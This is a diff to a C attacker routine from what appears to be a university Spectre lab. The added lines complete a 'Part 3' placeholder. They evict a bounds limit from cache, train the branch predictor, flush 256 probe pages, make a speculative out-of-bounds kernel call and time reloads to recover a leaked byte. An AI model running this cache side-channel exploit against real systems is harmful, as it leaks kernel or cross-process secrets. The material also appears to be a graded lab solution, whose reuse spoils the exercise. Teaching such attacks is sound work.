@@ -47,6 +47,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
+        
+        // Create Eviction Buffer to uncache part3_limit
+        char evict_buffer[SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE];
+
+
+
         uint64_t shortest_access = (uint64_t) -1;
         int best_i = -1;
         for (int trial = 0; trial < 200; trial++) {
@@ -55,14 +61,21 @@ int run_attacker(int kernel_fd, char *shared_memory) {
                 call_kernel_part3(kernel_fd, shared_memory, train % 4);
             }
 
+            // Evict part3_limit
+            char sink = 0;
+            for (int e = 0; e < SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE; e += 64) {
+                sink += evict_buffer[e];
+            }
 
-
+            // Flush addresses
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
             }
             
+            // Run attack
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
+            // Reload
             for (int i = 0; i < 256; i++) {
                 uint64_t access_time = time_access(&shared_memory[i*SHD_SPECTRE_LAB_PAGE_SIZE]);
                 if (access_time < shortest_access) {
